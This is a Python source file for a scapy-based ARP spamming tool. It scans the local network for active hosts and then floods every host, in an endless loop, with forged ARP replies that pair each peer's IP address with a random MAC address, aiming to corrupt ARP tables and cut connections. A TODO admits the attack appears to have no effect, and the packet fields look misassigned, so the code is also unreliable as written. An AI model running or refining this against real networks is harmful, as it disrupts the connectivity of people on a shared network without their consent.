import random
from scapy.all import *
import LocalNetworkScan as Scan


# TODO: Attack seems to have no effect
class ARP_Spamming:
    """Attack that attempts to change the ARP tables for all the machines to cause issues connecting"""

    def __init__(self):
        # Grabs live active hosts
        self.active_hosts = []
        self.scan_local_network()

        # Creates the set of random Mac addresses
        self.rnd_mac_addresses = []
        self.gen_random_mac_set(len(self.active_hosts))
        print(self.rnd_mac_addresses)

        self.running = True
        self.total_packets = 0

    def start(self):

        while self.running:
            # Talks to every machine and changes the ARP value
            for x in self.active_hosts:
                count = 0

                for y in self.active_hosts:
                    # Makes sure values are not interchanged between the same machine
                    if x is not y:
                        self.send_arp_packet(x, y, self.rnd_mac_addresses[count])

                    count += 1

    def stop(self):
        self.running = False

    def gen_random_mac_set(self, number):
        """Used to generate a random set of mac addresses that are then used"""

        for x in range(0, number):
            self.rnd_mac_addresses.append(self.rnd_mac())

    def print_stats(self, host_ip, src_ip, new_mac):
        print('[!] Dst: {} - Src: {} changed to: {}'.format(host_ip, src_ip, new_mac), end='\r')

    def send_arp_packet(self, dst, src, mac, op_code=2):
        self.print_stats(dst, src, mac)
        send(ARP(op=op_code, pdst=dst, psrc=src, hwdst=mac), verbose=0)
        self.total_packets += 1

    def scan_local_network(self):
        self.active_hosts = Scan.scan_for_active_hosts()

    def rnd_mac(self):
        """
        Used to generate random invalid mac addresses

        00:00:00:00:00:00 -> FF:FF:FF:FF:FF:FF
        """

        character_set = \
            ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
             'a', 'b', 'c', 'd', 'e', 'f']

        mac = ''

        # 12 values needed in a MAC address
        for x in range(0, 12):

            # Randomly grabs a new value
            new_index = random.randint(0, len(character_set) - 1)
            mac += character_set[new_index]

            # Adds the separator after every pair
            if x % 2 is not 0:
                mac += ':'

        # Trims of the extra ':' at the end
        return mac[:-1]
